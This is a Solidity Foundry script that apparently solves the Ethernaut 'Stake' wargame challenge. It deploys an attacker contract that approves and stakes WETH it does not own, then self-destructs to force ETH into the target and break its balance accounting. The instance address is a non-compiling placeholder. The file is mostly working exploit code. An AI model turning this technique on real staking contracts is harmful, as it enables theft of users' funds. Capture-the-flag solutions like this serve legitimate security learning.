// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/stake.sol"; // Importing the Stake contract
import "../lib/forge-std/src/Script.sol"; // Foundry scripting utilities
import {console} from "../lib/forge-std/src/Test.sol"; // For console logging during testing

// Main solution contract for the Stake Ethernaut challenge
contract StakeChallengeSolution is Script {

    Stake public stakeContract = Stake(0xYourInstanceAddressHere); // Replace with actual instance

    // Entry point for the solution
    function run() external {
        // Start broadcasting transactions from the private key in environment variables
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Stake 0.0011 ETH into the contract
        stakeContract.StakeETH{value: 0.0011 ether}();

        // Unstake the exact amount to avoid locking funds
        stakeContract.Unstake(0.0011 ether);

        // Deploy the attacker contract and interact with the Stake contract
        ExploitContract exploit = new ExploitContract(address(stakeContract));
        exploit.depositFunds{value: 0.0001 ether}();

        // Execute malicious staking logic and trigger the exploit
        exploit.stakeUsingWETH();
        exploit.triggerSelfDestruct();

        // Stop broadcasting transactions
        vm.stopBroadcast();
    }
}

// Attacker contract to perform the exploit
contract ExploitContract {
    address payable public stakeInstanceAddress;
    Stake public stakeInstance;
    address payable public wethAddress;

    // Constructor to initialize the target stake contract
    constructor(address targetStakeContract) {
        stakeInstanceAddress = payable(targetStakeContract);
        stakeInstance = Stake(targetStakeContract);
        wethAddress = payable(stakeInstance.WETH()); // Retrieve WETH address from the contract
    }

    // Function to deposit ETH into the contract
    function depositFunds() public payable returns (bool) {
        return true;
    }

    // Function to destroy the attacker contract and send any remaining ETH to the target contract
    function triggerSelfDestruct() public {
        selfdestruct(stakeInstanceAddress); // Transfers any remaining balance to the Stake contract
    }

    // Function to approve WETH and stake it into the target contract
    function stakeUsingWETH() public {
        // Construct the payload to approve WETH transfer
        bytes memory approvalPayload = abi.encodeWithSignature(
            "approve(address,uint256)", 
            stakeInstanceAddress, 
            0.0011 ether
        );

        // Call the WETH contract to approve the transfer
        (bool success,) = wethAddress.call(approvalPayload);
        require(success, "WETH approval failed");

        // Stake the approved WETH in the target Stake contract
        stakeInstance.StakeWETH(0.0011 ether);
    }

    // Fallback function to receive Ether
    receive() external payable {}
}